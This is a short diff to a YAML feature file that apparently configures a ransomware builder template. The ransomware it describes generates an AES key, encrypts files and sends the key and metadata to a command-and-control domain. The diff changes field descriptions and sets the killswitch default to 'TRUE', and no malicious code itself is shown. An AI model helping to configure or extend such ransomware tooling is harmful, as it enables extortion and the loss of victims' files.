@@ -5,7 +5,7 @@ description: "A basic ransomware that generate an AES key, encrypt files, then e
 template: "templates/base/kraken.c.j2"
 features:
   - name: c2_url
-    description: "the URL where the key and some metadata will be sent"
+    description: "the domain where the key and some metadata will be sent, no https://"
     type: "string"
     mandatory: True
     default: ""
@@ -30,7 +30,7 @@ features:
     mandatory: True
     default: ""
   - name: activate_killswitch
-    description: "activate the cross killswitch"
+    description: "activate the cross killswitch, need to be in CAPS"
     type: "bool"
     mandatory: False
-    default: "False"
+    default: "TRUE"
